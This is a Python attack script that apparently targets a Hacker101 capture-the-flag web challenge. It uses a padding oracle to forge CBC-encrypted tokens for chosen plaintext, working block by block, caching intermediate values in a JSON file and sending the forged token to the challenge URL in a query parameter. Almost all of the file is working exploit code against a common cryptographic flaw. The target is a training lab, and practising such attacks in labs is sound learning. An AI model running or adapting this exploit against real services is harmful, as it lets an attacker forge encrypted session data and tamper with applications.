#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys, requests, json
from base64 import b64encode, b64decode
from binascii import hexlify, unhexlify
from math import ceil

from padding_oracle_threads import run

try:
    data = json.load(open('data.json'))
except:
    data = {}



def _pad(text, block_size):
    no_of_blocks = ceil(len(text)/float(block_size))
    pad_value = int(no_of_blocks * block_size - len(text))

    if pad_value == 0:
        return text + chr(block_size) * block_size
    else:
        return text + chr(pad_value).encode() * pad_value


def xor(args):
    # Sort by len DESC
    args.sort(key=len, reverse=True)
    res = bytearray(args.pop(0))
    maxlen = len(res)

    for s in args:
        slen = len(s)
        for i in range(maxlen):
            res[i] ^= s[i % slen]
    return res

def from_str(s):
    res = b''
    for char in s.encode("utf-8").decode("unicode_escape"):
        res += bytes([ord(char)])
    return res


def get(hexdata):
    b64 = b64encode(hexdata).decode()
    b64 = b64.replace('=', '~').replace('/', '!').replace('+', '-')
    r = requests.get(url + b64)
    print('-'*64)
    print(r.text)

def inject(txt):
    #plain = from_str('{"flag": "^FLAG^')
    plain = bytes.fromhex('D8D58EAEA080B26189290781CB57B879') # PLAIN FOR 00000000000000000000000000000000
    crypt = bytes.fromhex('00000000000000000000000000000000')
    zero = bytes.fromhex('00000000000000000000000000000000')

    txtpad = _pad(txt.encode(), block_size)
    txt_blocks = [txtpad[i : i + block_size] for i in range(0, len(txtpad), block_size)]
    print(txt_blocks)

    payload = zero
    for block in reversed(range(1, len(txt_blocks))):
        print('%03i  %s' % (block, txt_blocks[block]))

        tmp = xor([txt_blocks[block], plain])

        #CHECK FIRST IN DB
        if hexlify(tmp).decode() in data:
            result = data[hexlify(tmp).decode()]
            print("Loading from DB %s %s" % (hexlify(tmp), result))
        else:
            result = run(url, hexlify(zero + tmp).decode())
            print(result)
            if result:
                data[hexlify(tmp).decode()] = result
                try:
                    json.dump(data, open("data.json", 'w'))
                    print("Saved in DB %s %s" % (hexlify(tmp), result))
                except:
                    print("Error saving DB")

        plain = bytes.fromhex(result)
        crypt = tmp
        payload = crypt + payload

    # FIRST BLOCK
    print('%03i  %s' % (0, txt_blocks[0]))
    tmp = xor([txt_blocks[0], plain])
    payload = tmp + payload

    return payload


if __name__ == "__main__":
    block_size = 16
    url = 'https://5e0dbed32e3e0b25900f17949e212b9a.ctf.hacker101.com/?post='

    if len(sys.argv)>1:
        txt = sys.argv[1]
    else:
        txt = '{"id":"1"}'

    payload = inject(txt)
    if payload:
        print(hexlify(payload))
        get(payload)
